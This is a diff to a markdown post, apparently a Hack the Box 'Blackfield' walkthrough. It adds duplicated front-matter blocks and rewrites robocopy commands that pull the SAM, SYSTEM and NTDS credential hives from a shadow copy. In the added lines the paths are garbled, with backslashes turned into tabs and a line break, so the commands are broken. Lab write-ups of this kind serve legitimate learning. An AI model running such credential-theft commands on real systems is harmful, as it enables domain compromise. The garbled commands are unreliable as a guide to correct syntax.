@@ -1,4 +1,18 @@
 ---
+title: Blackfield - Hack the Box
+date: 2024-10-13 12:07:03 -0400
+categories: [Hack the Box]
+tags: [Walkthrough]
+image: /assets/Blackfield.png
+---
+---
+title: 2024-10-12-Blackfield - Hack the Box
+date: 2024-10-13 12:01:04 -0400
+categories: [Hack the Box]
+tags: [Walkthrough]
+image: /assets/2024-10-12-Blackfield.png
+---
+---
 title: TITLE
 date: YYYY-MM-DD HH:MM:SS +/-TTTT
 categories: [TOP_CATEGORIE, SUB_CATEGORIE]
@@ -164,9 +178,10 @@ echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
 
 Now, after checking to see that the drive was created, and it has the files we need, we can transfer them to our `/temp` directory with `robocopy`.
 
-`robocopy /b Z:\Windows\System32\Config C:\temp SAM`
-`robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM`
-`robocopy /b Z:\Windows\ntds C:\temp NTDS`
+`robocopy /b Z:\Windows\System32\Config C:	emp SAM`
+`robocopy /b Z:\Windows\System32\Config C:	emp SYSTEM`
+`robocopy /b Z:\Windows
+tds C:	emp NTDS`
 
 Now we can download them onto our machine:
 
